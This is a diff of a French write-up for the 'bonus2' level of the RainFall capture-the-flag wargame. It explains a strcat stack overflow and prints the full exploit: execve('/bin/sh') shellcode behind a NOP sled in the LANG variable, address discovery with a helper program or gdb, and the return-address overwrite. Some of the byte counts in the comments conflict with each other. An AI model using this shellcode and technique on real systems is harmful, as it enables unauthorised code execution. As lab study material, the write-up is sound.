@@ -1,4 +1,4 @@
-# bonus2
+# bonus2 — sled nop + overflow
     void greetuser(void)
     {
         char local_4c [4];
@@ -93,7 +93,7 @@ en clair:
     int language = 0;
 
     void greetuser(char *src) {
-        char dest[72]; // Espace alloué sur la stack pour le message d'accueil + src
+        char dest[72];
         
         switch (language) {
             case 1: 
@@ -101,62 +101,53 @@ en clair:
                 break;
             case 2: 
                 strcpy(dest, "Goedemiddag! "); 
-                // ETAPE 1 : Le préfixe "Goedemiddag! " est copié au début du buffer dest.
-                // Mémoire (13 octets) : [ G o e d e m i d d a g !   \0 ... ]
+                // Mémoire (13 octets) : [ Goedemiddag! \0...]
                 break;
             default: 
                 strcpy(dest, "Hello "); 
                 break;
         }
         
-        // src contient vos 72 octets contrôlés via argv[1] et argv[2]
-        strcat(dest, src); 
-        // ETAPE 2 : strcat prend src et le colle juste après le préfixe.
-        // Mémoire : [ G o e d e m i d d a g !   |   A A A A A A A A ... (72 octets) ]
-        // TOTAL : 13 octets (préfixe) + 72 octets (src) = 85 octets écrits.
-        // Le buffer 'dest' ne faisant que 72 octets, l'écriture déborde de 13 octets.
-        // Les 13 octets en trop écrasent le Saved EBP et surtout le Saved EIP (adresse de retour).
+        strcat(dest, src);
+
+        // Mémoire : [Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB\x\x\x\x\0]
+        // TOTAL : 13 octets (préfixe) + 63 octets (src) = 81
+        // Le buffer 'dest' ne faisant que 72 octets, l'écriture déborde de 9 octets.
 
         puts(dest);
     }
 
     int main(int argc, char **argv) {
-        char dest[76]; // 40 octets + 36 octets contigus
+        char dest[76];
         
         if (argc != 3) {
             return 1;
         }
         
-        // Initialisation du buffer à zéro
         memset(dest, 0, sizeof(dest));
-        // ETAPE 1 : Le tableau dest[76] est entièrement mis à zéros (\0).
-        // Mémoire : [ \0 \0 \0 ... (76 octets) ]
+        // Le tableau dest[76] est entièrement mis à zéros (\0).
+        // Mémoire : [ \0\0\0... (76 octets) ]
         
         // Copie contrôlée des arguments (40 octets + 32 octets = 72 octets max)
-        strncpy(dest, argv[1], 40);       // 0x28
-        // ETAPE 2 : Les 40 premiers octets d'argv[1] (ex: vos 100 'A' tronqués à 40) sont copiés.
-        // Mémoire : [ A A A A A A A A ... (40 octets) | \0 \0 ... (36 octets restants) ]
+        strncpy(dest, argv[1], 40);
+        // Les 40 premiers octets d'argv[1] (40 A) sont copiés
+        // Mémoire : [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA................................]
 
-        strncpy(dest + 40, argv[2], 32);  // 0x20
-        // ETAPE 3 : Les 32 octets d'argv[2] (vos 'B' + l'adresse de retour) sont collés juste après.
-        // Mémoire : [ 40 octets d'argv[1] | 32 octets d'argv[2] | 4 derniers octets inchangés (\0) ]
-        // TOTAL : 72 octets écrits proprement dans dest[76]. Le buffer est plein, mais ne déborde PAS encore ici.
+        strncpy(dest + 40, argv[2], 32);
+        // Mémoire : [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB\x\x\x\x\0\0\0\0\0]
         
-        // Vérification de la variable d'environnement LANG
         char *lang = getenv("LANG");
         if (lang != NULL) {
             if (memcmp(lang, "fi", 2) == 0) {
                 language = 1;
             } else if (memcmp(lang, "nl", 2) == 0) {
                 language = 2;
-                // ETAPE 4 : LANG commence par "nl", donc language passe à 2. 
-                // Cela forcera greetuser à utiliser le préfixe "Goedemiddag! ".
+                // LANG commence par "nl", donc language passe à 2. 
+                // Cela force "Goedemiddag! dans greetuser ".
             }
         }
         
         greetuser(dest);
-        // ETAPE 5 : On transmet notre variable 'dest' (76 octets préparés) à greetuser(). 
-        // C'est là-bas que le strcat final va provoquer l'explosion de la pile.
         return 0;
     }
 
@@ -179,32 +170,27 @@ en clair:
 
     61616761 = agaa = offset 23
 
-**La technique : shellcode planqué dans `LANG` lui-même**
+**Trouver l'adresse de `LANG`**
 
-`LANG` est une variable d'environnement donc elle est sur la pile, à une adresse qu'on peut retrouver, et son contenu est entièrement sous contrôle (le programme ne vérifie que les 2 premiers caractères `"nl"`). On y planque un NOP sled + shellcode juste après :
+    echo 'int main(){printf("%p\n",getenv("LANG"));}' | gcc -xc - -o /tmp/addr && /tmp/addr
+    bonus2@RainFall:~$ echo 'int main(){printf("%p\n",getenv("LANG"));}' | gcc -xc - -o /tmp/addr && /tmp/addr
+    <stdin>: In function ‘main’:
+    <stdin>:1:12: warning: incompatible implicit declaration of built-in function ‘printf’ [enabled by default]
+    <stdin>:1:1: warning: format ‘%p’ expects argument of type ‘void *’, but argument 2 has type ‘int’ [-Wformat]
+    0xbfffff1d
+
+**payload dans `LANG`**
+
+`LANG` est une variable d'environnement donc elle est sur la stack, à une adresse qu'on peut retrouver, et son contenu est entièrement sous contrôle (le programme ne vérifie que les 2 premiers caractères `"nl"`). On y planque un NOP sled + shellcode juste après :
+
+Le meme payload que tous les niveaux `execve("/bin//sh")` ?
 
     export LANG=$(printf 'nl'; printf '\x90%.0s' {1..100}; printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')
 
-**Trouver l'adresse de `LANG`, en simple**
 
-Plus besoin de gdb : `gcc` est dispo sur la machine, autant compiler un mini-programme qui appelle `getenv("LANG")` directement et lire l'adresse qu'il donne :
+**redirection + overflow**
 
-    echo 'int main(){printf("%p\n",getenv("LANG"));}' | gcc -xc -include stdio.h -include stdlib.h -o /tmp/addr -
-    /tmp/addr
+`argv[1]` = 40 octets de bourrage, `argv[2]` = 23 octets (offset) de bourrage jusqu'à l'adresse de retour + l'adresse de `LANG` (little-endian) :
 
-Le NOP sled donne de la marge (comme au bonus0), pas besoin que l'adresse soit exacte au byte près.
+    ./bonus2 $(printf 'A%.0s' {1..40}) $(printf 'B%.0s' {1..23}; printf '\x1d\xff\xff\xbf')
 
-Repli si `gcc` n'est pas dispo : retrouver l'adresse dans `environ` via un breakpoint gdb juste après le `getenv` du programme lui-même :
-
-    (gdb) b *main+125
-    (gdb) run $(printf 'A%.0s' {1..100}) pop
-    (gdb) x/20s *((char**)environ)
-    0xbffffeb4: "LANG=nl\220\220\220...\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
-
-**Construire le payload**
-
-`argv[1]` = 100 octets de bourrage (rempli le message + le début du buffer). `argv[2]` = 23 octets de bourrage jusqu'à l'adresse de retour + l'adresse de `LANG` (little-endian) :
-
-    ./bonus2 $(printf 'A%.0s' {1..100}) $(printf 'B%.0s' {1..23}; printf '\xe6\xfe\xff\xbf')
-
-Donne un shell `bonus3`.
